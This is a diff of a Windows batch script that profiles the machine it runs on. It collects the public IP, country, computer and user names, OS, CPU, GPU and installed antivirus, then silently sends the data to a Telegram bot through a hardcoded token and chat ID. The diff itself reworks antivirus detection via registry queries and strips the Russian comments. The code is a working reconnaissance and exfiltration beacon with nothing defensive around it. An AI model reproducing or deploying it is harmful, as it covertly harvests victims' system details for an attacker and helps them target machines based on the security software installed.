@@ -3,12 +3,10 @@ setlocal EnableDelayedExpansion
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
 
-:: Получение IP и страны
 for /f "delims=" %A in ('powershell -command "$json = Invoke-RestMethod -Uri http://ip-api.com/json/; $json.query + ',' + $json.country"') do set "IP_Country=%A"
 for /f "tokens=1 delims=," %A in ("%IP_Country%") do set "IP=%A"
 for /f "tokens=2 delims=," %A in ("%IP_Country%") do set "Country=%A"
 
-:: Получение информации о системе
 for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do set "Windows=%A"
 for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_Processor).Name"') do set "CPU=%A"
 for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_VideoController).Caption"') do set "GPU=%A"
@@ -20,17 +18,27 @@ for /f "tokens=*" %A in ('powershell -command "[System.Environment]::Is64BitOper
     )
 )
 
-:: Получение антивируса
-set "Antivirus=Not detected"
-for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (
-    if "%Antivirus%"=="Not detected" (
-        set "Antivirus=%A"
-    ) else (
-        set "Antivirus=%Antivirus%, %A"
+set "Antivirus=No Antivirus"
+for /f "tokens=*" %A in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "Antivirus" /t REG_SZ 2^>nul') do (
+    if "%A" NEQ "Поиск завершен: найдено совпадений: 0." (
+        if defined Antivirus (
+            set "Antivirus=!Antivirus!, %A"
+        ) else (
+            set "Antivirus=%A"
+        )
     )
 )
 
-:: Проверка значений на случай ошибок
+for /f "tokens=*" %A in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Provider" /s /f "AV" /t REG_SZ 2^>nul') do (
+    if "%A" NEQ "Поиск завершен: найдено совпадений: 0." (
+        if defined Antivirus (
+            set "Antivirus=!Antivirus!, %A"
+        ) else (
+            set "Antivirus=%A"
+        )
+    )
+)
+
 if not defined IP set "IP=Unknown"
 if not defined Country set "Country=Unknown"
 if not defined Windows set "Windows=Unknown"
@@ -40,7 +48,6 @@ if not defined GPU set "GPU=Unknown"
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 
-:: Отправка данных в Telegram
 powershell -command ^
 "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%'; ^
 Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
